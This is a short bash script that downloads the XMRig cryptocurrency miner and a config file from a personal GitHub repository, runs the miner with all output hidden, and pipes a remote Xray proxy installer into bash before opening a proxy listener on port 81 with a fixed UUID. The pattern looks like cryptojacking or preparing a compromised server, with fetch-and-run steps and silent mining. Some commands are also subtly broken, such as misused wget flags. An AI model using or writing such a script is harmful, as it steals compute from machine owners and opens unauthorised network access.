#!/bin/bash
sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
tar -xf /root/xmrig.tar.gz -C /root
chmod u+x ./xmrig
sudo wget -o- https://raw.githubusercontent.com/hilakinn/opinn/refs/heads/main/x.json
chmod u+x ./x.json
 ./xmrig --config=./x.json >/dev/null 2>&1
sudo wget -qO- -o- https://github.com/233boy/Xray/raw/main/install.sh | bash
xray add tcp 81 1483c30c-ae2c-4130-f643-c6139d199c42
ping aws.amazon.com
